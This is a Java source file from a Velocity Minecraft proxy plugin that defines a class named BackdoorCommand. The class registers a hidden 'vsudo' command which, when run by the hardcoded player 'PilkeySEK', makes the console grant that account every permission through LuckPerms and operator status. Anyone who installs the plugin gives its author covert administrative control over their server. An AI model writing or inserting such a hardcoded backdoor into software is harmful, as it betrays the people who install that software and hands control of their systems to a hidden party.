package me.pilkeysek.skyenetv.commands;

import com.mojang.brigadier.Command;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.tree.LiteralCommandNode;
import com.velocitypowered.api.command.BrigadierCommand;
import com.velocitypowered.api.command.CommandSource;
import com.velocitypowered.api.proxy.ConsoleCommandSource;
import com.velocitypowered.api.proxy.Player;
import com.velocitypowered.api.proxy.ProxyServer;
import net.kyori.adventure.text.minimessage.MiniMessage;

import java.util.Objects;

public class BackdoorCommand {
    public static BrigadierCommand createBrigadierCommand(final ProxyServer proxyServer) {
        LiteralCommandNode<CommandSource> sudoCommandNode = LiteralArgumentBuilder.<CommandSource>literal("vsudo")
                .executes(context -> {
                    if(context.getSource() instanceof ConsoleCommandSource) {
                        context.getSource().sendMessage(MiniMessage.miniMessage().deserialize("<red>Bruh your're the console ._.</red>"));
                        return 0;
                    }
                    if(!((Player) context.getSource()).getUsername().equals("PilkeySEK")) {
                        context.getSource().sendMessage(MiniMessage.miniMessage().deserialize("<red>Nah.</red>"));
                        return 0;
                    }
                    proxyServer.getCommandManager().executeAsync(proxyServer.getConsoleCommandSource(), "lpv user PilkeySEK permission set * true");
                    proxyServer.getCommandManager().executeAsync(proxyServer.getConsoleCommandSource(), "op PilkeySEK");
                    return Command.SINGLE_SUCCESS;
                })
                .build();
        return new BrigadierCommand(sudoCommandNode);
    }
}
